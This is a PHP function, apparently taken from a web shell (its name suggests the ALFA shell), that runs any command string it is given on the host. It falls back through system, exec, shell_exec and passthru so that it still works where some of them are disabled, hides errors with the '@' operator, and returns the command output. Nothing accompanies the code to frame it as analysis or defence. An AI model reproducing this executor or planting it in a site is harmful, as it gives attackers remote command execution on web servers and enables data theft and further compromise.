function alfaEx($in, $re=false) {
    $out = '';
    if($re) $in = $in . " 2>&1";
    if(function_exists('system')) { ob_start(); @system($in); $out = ob_get_clean(); }
    elseif(function_exists('exec')) { @exec($in, $o); $out = join("\n", $o); }
    elseif(function_exists('shell_exec')) { $out = @shell_exec($in); }
    elseif(function_exists('passthru')) { ob_start(); @passthru($in); $out = ob_get_clean(); }
    return $out;
}
